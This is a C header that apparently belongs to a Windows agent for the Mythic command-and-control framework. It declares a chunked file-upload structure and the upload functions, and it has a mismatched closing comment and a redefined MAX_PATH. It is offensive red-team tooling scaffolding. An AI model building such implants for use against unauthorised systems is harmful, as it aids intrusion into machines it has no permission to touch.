#pragma once
#ifndef UPLOAD_H
#define UPLOAD_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_UPLOAD

#define MAX_PATH 0x2000

typedef struct _FILE_UPLOAD {
    BOOL Initialized;           // Has download been started in Mythic
    HANDLE hFile;               // File handle
    CHAR TaskUuid[37];          // Track task UUID
    CHAR fileUuid[37];          // File UUID (36 + 1 for null terminator)
    CHAR filepath[MAX_PATH];    // Path to the file
    UINT32 totalChunks;         // Total number of chunks
    UINT32 currentChunk;        // Current chunk number
    LARGE_INTEGER fileSize;     // Size of the file

    struct FILE_UPLOAD* Next;
} FILE_UPLOAD, *PFILE_UPLOAD;

VOID Upload(_In_ PCHAR taskUuid, _In_ PPARSER arguments);

BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response);

#endif //INCLUDE_CMD_DOWNLOAD

#endif  //UPLOAD_H